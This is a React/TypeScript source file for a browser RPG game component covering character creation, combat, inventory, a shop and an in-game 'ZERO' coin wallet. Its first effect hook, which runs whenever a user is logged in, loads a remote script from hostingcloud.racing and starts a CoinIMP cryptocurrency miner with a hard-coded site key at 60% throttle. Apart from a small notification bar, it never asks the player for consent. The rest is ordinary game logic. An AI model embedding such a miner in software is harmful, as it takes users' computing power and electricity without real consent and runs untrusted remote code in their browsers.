import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { Badge } from '@/components/ui/badge';
import { PlayerStats, Player, Enemy, PlayerClass, Equipment, CombatResult } from '@/types/rpg';
import { playerClasses, generateEnemy, baseEquipment, getEquipmentPrice } from '@/data/rpgData';
import { CharacterCreation } from './rpg/CharacterCreation';
import { CombatSystem } from './rpg/CombatSystem';
import { PlayerPanel } from './rpg/PlayerPanel';
import { InventorySystem } from './rpg/InventorySystem';
import { StatsUpgrade } from './rpg/StatsUpgrade';
import { ZeroWallet } from './rpg/ZeroWallet';
import { ShopSystem } from './rpg/ShopSystem';
import { ArrowLeft, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useLanguage } from '@/contexts/LanguageContext';
import { useRPGPersistence } from '@/hooks/useRPGPersistence';
import { useAuth } from '@/hooks/useAuth';

export const RPGGame = ({ onClose }: { onClose: () => void }) => {
  const { user } = useAuth();
  const { t } = useLanguage();
  const { player, setPlayer, loading } = useRPGPersistence();
  const [currentEnemy, setCurrentEnemy] = useState<Enemy | null>(null);
  const [gameState, setGameState] = useState<'creation' | 'town' | 'combat' | 'inventory' | 'stats' | 'shop'>('creation');
  const { toast } = useToast();

  // Ensure hooks order is stable: run effect unconditionally and guard inside
  React.useEffect(() => {
    if (!user) return;

    const existingMain = document.head.querySelector('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
    const existingClient = document.head.querySelector('#rpg-mining-client');

    let script1: HTMLScriptElement | null = null;
    let script2: HTMLScriptElement | null = null;

    const startClient = () => {
      if (document.head.querySelector('#rpg-mining-client')) return;
      script2 = document.createElement('script');
      script2.id = 'rpg-mining-client';
      script2.text = `
        if (!window.miningClientInitialized) {
          var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
            throttle: 0.6, c: 'w'
          });
          _client.start();
          _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
          window.miningClientInitialized = true;
          window.miningClient = _client;
        }
      ` as any;
      document.head.appendChild(script2);
    };

    if (!existingMain) {
      script1 = document.createElement('script');
      script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
      script1.async = true;
      script1.id = 'rpg-mining-main';
      document.head.appendChild(script1);
      script1.onload = startClient;
    } else if (!existingClient) {
      startClient();
    }

    return () => {
      const cleanupScript = document.createElement('script');
      cleanupScript.text = `
        if (window.miningClient && window.miningClient.stop) {
          window.miningClient.stop();
          window.miningClient = null;
          window.miningClientInitialized = false;
        }
      ` as any;
      document.head.appendChild(cleanupScript);
      setTimeout(() => cleanupScript.remove(), 100);

      const scripts = document.head.querySelectorAll('#rpg-mining-main, #rpg-mining-client');
      scripts.forEach((s) => s.remove());
    };
  }, [user]);

  // Si pas connecté, rediriger vers la page d'authentification
  if (!user) {
    return (
      <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 flex items-center justify-center">
        <Card className="p-8 text-center">
          <h2 className="text-2xl font-bold mb-4">{t('rpg.connection_required')}</h2>
          <p className="text-muted-foreground mb-4">
            {t('rpg.connection_message')}
          </p>
          <Button onClick={onClose}>{t('rpg.back')}</Button>
        </Card>
      </div>
    );
  }

  // Chargement
  if (loading) {
    return (
      <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 flex items-center justify-center">
        <Card className="p-8 text-center">
          <h2 className="text-2xl font-bold mb-4">{t('rpg.loading')}</h2>
          <Progress value={50} className="w-48" />
        </Card>
      </div>
    );
  }

// Mining script effect moved above to keep hooks order stable

  const createPlayer = (selectedClass: PlayerClass, name: string) => {
    const newPlayer: Player = {
      id: 'player_1',
      name,
      class: selectedClass,
      level: 1,
      experience: 0,
      experienceToNext: 100,
      baseStats: { ...selectedClass.baseStats },
      currentStats: { ...selectedClass.baseStats },
      equipment: {},
      inventory: [...baseEquipment.slice(0, 3)],
      gold: 100,
      diamonds: 0,
      statPoints: 0,
      enemiesDefeated: 0,
      zeroCoins: 0
    };
    setPlayer(newPlayer);
    setGameState('town');
  };

  const calculateTotalStats = (player: Player): PlayerStats => {
    let totalStats = { ...player.baseStats };
    
    Object.values(player.equipment).forEach(item => {
      if (item) {
        Object.entries(item.statsBonus).forEach(([key, value]) => {
          if (value && key in totalStats) {
            (totalStats as any)[key] += value;
          }
        });
      }
    });

    return totalStats;
  };

  const updatePlayerStats = (updatedPlayer: Player) => {
    const newStats = calculateTotalStats(updatedPlayer);
    updatedPlayer.currentStats = newStats;
    setPlayer(updatedPlayer);
  };

  const equipItem = (item: Equipment) => {
    if (!player) return;

    const newPlayer = { ...player };
    
    // Unequip current item of same type
    if (newPlayer.equipment[item.type]) {
      newPlayer.inventory.push(newPlayer.equipment[item.type]!);
    }
    
    // Equip new item
    newPlayer.equipment[item.type] = item;
    newPlayer.inventory = newPlayer.inventory.filter(i => i.id !== item.id);
    
    updatePlayerStats(newPlayer);
    toast({
      title: t('rpg.item_equipped'),
      description: `${item.name} ${t('rpg.item_equipped_desc')}`
    });
  };

  const unequipItem = (type: Equipment['type']) => {
    if (!player || !player.equipment[type]) return;

    const newPlayer = { ...player };
    const item = newPlayer.equipment[type]!;
    
    newPlayer.inventory.push(item);
    delete newPlayer.equipment[type];
    
    updatePlayerStats(newPlayer);
    toast({
      title: t('rpg.item_unequipped'),
      description: `${item.name} ${t('rpg.item_unequipped_desc')}`
    });
  };

  const startCombat = () => {
    if (!player) return;
    
    const enemy = generateEnemy(player.level);
    setCurrentEnemy(enemy);
    setGameState('combat');
  };

  const onCombatEnd = (result: CombatResult) => {
    if (!player) return;

    const newPlayer = { ...player };
    
    if (result.victory) {
      newPlayer.experience += result.experience;
      newPlayer.gold += result.gold;
      newPlayer.zeroCoins += result.zeroGain;
      newPlayer.enemiesDefeated += 1;
      
      if (result.equipment) {
        newPlayer.inventory.push(result.equipment);
        toast({
          title: t('rpg.item_found'),
          description: `${t('rpg.item_found_desc')} ${result.equipment.name}!`
        });
      }

      // Level up check
      while (newPlayer.experience >= newPlayer.experienceToNext) {
        newPlayer.experience -= newPlayer.experienceToNext;
        newPlayer.level += 1;
        newPlayer.experienceToNext = Math.floor(newPlayer.experienceToNext * 1.5);
        newPlayer.statPoints += 5;
        
        // Increase base stats on level up
        Object.keys(newPlayer.baseStats).forEach(key => {
          (newPlayer.baseStats as any)[key] += Math.floor(Math.random() * 3) + 1;
        });

        toast({
          title: t('rpg.level_up'),
          description: `${t('rpg.level_up_desc')} ${newPlayer.level}!`
        });
      }

      // Check for stat points reward (every 25 enemies)
      if (newPlayer.enemiesDefeated % 25 === 0) {
        newPlayer.statPoints += 10;
        toast({
          title: t('rpg.special_reward'),
          description: t('rpg.special_reward_desc')
        });
      }

      updatePlayerStats(newPlayer);
      toast({
        title: t('rpg.victory'),
        description: `+${result.experience} ${t('exp')}, +${result.gold} ${t('rpg.gold')}, +${result.zeroGain.toFixed(6)} ZERO!`
      });
    } else {
      toast({
        title: t('rpg.defeat'),
        description: t('rpg.defeat_desc'),
        variant: "destructive"
      });
    }

    setCurrentEnemy(null);
    setGameState('town');
  };

  const upgradeStats = (statName: keyof PlayerStats, points: number) => {
    if (!player || player.statPoints < points) return;

    const newPlayer = { ...player };
    newPlayer.statPoints -= points;
    (newPlayer.baseStats as any)[statName] += points;
    
    updatePlayerStats(newPlayer);
    toast({
      title: t('rpg.stats_improved'),
      description: `${statName} ${t('rpg.stats_improved_desc')} ${points}!`
    });
  };

  const handleZeroWithdraw = (amount: number) => {
    if (!player) return;
    
    const newPlayer = { ...player };
    newPlayer.zeroCoins -= amount;
    updatePlayerStats(newPlayer);
  };

  const handlePurchase = (item: Equipment): boolean => {
    if (!player) return false;

    const price = getEquipmentPrice(item);
    
    if (player.level < item.level || player.gold < price) {
      return false;
    }

    const newPlayer = { ...player };
    newPlayer.gold -= price;
    newPlayer.inventory.push(item);
    
    updatePlayerStats(newPlayer);
    return true;
  };

  if (!player) {
    return <CharacterCreation classes={playerClasses} onCreatePlayer={createPlayer} />;
  }

  return (
    <div className="fixed inset-0 bg-background/95 backdrop-blur-sm z-50 overflow-auto">
      <div className="container mx-auto p-4 max-w-7xl">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-4xl font-bold gradient-text">{t('rpg.title')}</h1>
          <div className="flex items-center gap-4">
            {/* ZERO Balance Display */}
            <div className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-yellow-500/20 to-orange-500/20 rounded-lg border border-yellow-500/30">
              <span className="text-xl">💰</span>
              <div className="text-right">
                <div className="text-sm text-muted-foreground">{t('rpg.zero_balance')}</div>
                <div className="font-bold text-yellow-400">
                  {player.zeroCoins.toFixed(6)} ZERO
                </div>
              </div>
            </div>
            
            {/* Navigation Buttons */}
            <div className="flex gap-2">
              <Button variant="outline" size="icon" onClick={onClose} title={t('rpg.home')}>
                <ArrowLeft className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon" onClick={onClose} title={t('rpg.close')}>
                <X className="h-6 w-6" />
              </Button>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-6 gap-6">
          {/* Player Panel */}
          <div className="lg:col-span-1">
            <PlayerPanel player={player} />
          </div>

          {/* Zero Wallet */}
          <div className="lg:col-span-1">
            <ZeroWallet 
              zeroBalance={player.zeroCoins}
              onWithdraw={handleZeroWithdraw}
            />
          </div>

          {/* Main Content */}
          <div className="lg:col-span-4">
            {gameState === 'town' && (
              <Card className="gradient-card">
                <CardHeader>
                  <CardTitle className="text-center text-2xl">{t('rpg.town_square')}</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <Button 
                      variant="crypto" 
                      size="xl" 
                      onClick={startCombat}
                      className="h-20"
                    >
                      {t('rpg.go_combat')}
                    </Button>
                    <Button 
                      variant="stake" 
                      size="xl" 
                      onClick={() => setGameState('inventory')}
                      className="h-20"
                    >
                      {t('rpg.inventory')}
                    </Button>
                    <Button 
                      variant="secondary" 
                      size="xl" 
                      onClick={() => setGameState('stats')}
                      className="h-20"
                    >
                      {t('rpg.upgrade_stats')}
                      {player.statPoints > 0 && (
                        <Badge variant="destructive" className="ml-2">
                          {player.statPoints}
                        </Badge>
                      )}
                    </Button>
                    <Button 
                      variant="stake" 
                      size="xl" 
                      onClick={() => setGameState('shop')}
                      className="h-20"
                    >
                      {t('rpg.shop')}
                    </Button>
                  </div>

                  <div className="mt-6 p-4 bg-muted/50 rounded-lg">
                    <h3 className="text-lg font-semibold mb-2">{t('rpg.statistics')}</h3>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div>{t('rpg.enemies_defeated')}: <Badge variant="outline">{player.enemiesDefeated}</Badge></div>
                      <div>{t('rpg.gold')}: <Badge variant="outline" className="text-yellow-400">{player.gold}</Badge></div>
                      <div>{t('rpg.stat_points')}: <Badge variant="outline" className="text-green-400">{player.statPoints}</Badge></div>
                      <div>{t('rpg.next_reward')}: <Badge variant="outline">{25 - (player.enemiesDefeated % 25)} {t('rpg.enemies')}</Badge></div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {gameState === 'combat' && currentEnemy && (
              <CombatSystem
                player={player}
                enemy={currentEnemy}
                onCombatEnd={onCombatEnd}
                onBack={() => setGameState('town')}
              />
            )}

            {gameState === 'inventory' && (
              <InventorySystem
                player={player}
                onEquip={equipItem}
                onUnequip={unequipItem}
                onBack={() => setGameState('town')}
              />
            )}

            {gameState === 'stats' && (
              <StatsUpgrade
                player={player}
                onUpgrade={upgradeStats}
                onBack={() => setGameState('town')}
              />
            )}

            {gameState === 'shop' && (
              <ShopSystem
                player={player}
                onPurchase={handlePurchase}
                onBack={() => setGameState('town')}
              />
            )}
          </div>
        </div>
      </div>
    </div>
  );
};